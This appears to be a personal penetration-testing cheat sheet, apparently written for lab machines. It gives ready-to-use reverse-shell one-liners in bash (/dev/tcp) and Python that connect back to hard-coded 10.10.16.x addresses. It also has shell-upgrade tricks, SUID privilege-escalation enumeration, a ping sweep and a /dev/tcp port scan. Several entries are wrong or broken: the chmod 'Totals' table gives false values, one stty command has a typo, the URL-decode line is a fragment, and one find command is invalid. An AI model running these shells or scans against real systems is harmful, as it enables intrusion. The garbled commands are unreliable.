## Table of Contents

- [Reverse Shells](#reverse\shells)
  - [Upgrade shell](#Upgrade\shell)
- [Upgrade shell using python tty](#upgrade\shell\using\python\tty)
- [python/pypy stuff](#python/pypy\stuff)
    - [Python Reverse shell One liner](#Python\Reverse\shell\One\liner)
        - [**Chmod Numbers**](#**Chmod\Numbers**)
- [Linux Enumeration for SUID Binaries](#linux\enumeration\for\suid\binaries)
  - [Start/Stop Docker Service](#Start/Stop\Docker\Service)

 ### One liners
# Reverse Shells
```
bash -i >& /dev/tcp/10.10.16.3/4242 0>&1
```
#reverseshell #bash
## Upgrade shell
 ```bash
#Upgrade shell
script /dev/null -c bash
[CTRL + Z]$ ^Z
home@shell$stty raw -echo;rg

# Upgrade shell using python tty
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
#upgradeshell
# python/pypy stuff
### #Python Reverse shell One liner
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\`
```
#pythonshell #python 
**python shell upgrade**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'\`
```

**Find all binary files that are own/Ran under a different user with execute permissions:**
```bash
find / -type[f,b,d] ! -user $(whoami) -perm /u=x\
```
#finddifferentuserexecuteperms
**Kill OpenVPN**
```bash
sudo kill -9 $(ps aux | grep openvpn | grep -v grep | awk '{print $2}')
```
#openvpn
**Retrieve all users on a windows machine using PowerShell**
```powershell
Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"
```
#powershell #getusers #windows
**Fully update Linux/Kali Linux machiness**
```bash

sudo apt-get update && sudo apt upgrade -y && sudo apt dist-upgrade && sudo apt autoremove
```
#upgrade #linux 
**Windows PowerShell command to retrieve info about a file, below gets size (in bytes) of a .exe**
```powershell
$file = Get-Item "path_to_your_file.exe"
$file.Length
```
#windows #fileinfo #Get-Item #Get-ItemLength
**Download an entire website**
```shell
wget --random-wait -r -p -e robots=off -U mozilla http://example.com
```
#download #website

**URL Decoding** 
```shell
 -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' |  [xargs] echo -e
```

**How can I format USB drive in CMD on windows?**
You can press Windows + R, type cmd, and press Ctrl + Shift + Enter to run Command Prompt as administrator. Then type the following commands and press Enter after each command.
- `diskpart`
- `list disk`
- `select disk *` (replace * with the exact disk number of USB)
- `clean`
- `format fs=fat32 quick` (replace fat32 with ntfs if you want to format USB to ntfs format)
- `assign letter=*` (replace * with preferred drive letter)
- `exit`

##### **Chmod Numbers**
Number | Permissions | Totals
-------------------------------------------------
```bash
0 | --- | 0+0+0 = 000
1 | --x | 0+0+1 = 001
2 | -w- | 0+2+0 = 020
3 | -wx | 0+2+1 = 021
4 | r-- | 4+0+0 = 400
5 | r-x | 4+0+1 = 555
6 | rw- | 4+2+0 = 666
7 | rwx | 4+2+1 = 777 
```
#file permissions
**Ping Sweep Example**
```shell
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```
#pingsweep

```shell
root@3a453ab39d3d:~ for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null           
22 open
80 open
```

# Linux Enumeration for SUID Binaries
```shell
find / -perm -4000 -exec ls -ld {} \; 2>/dev/null
```
#suidbinaries #linuxenum #privesc

## Start/Stop Docker Service
```shell
sudo systemctl stop docker
Activate with: docker.socket
```
#docker










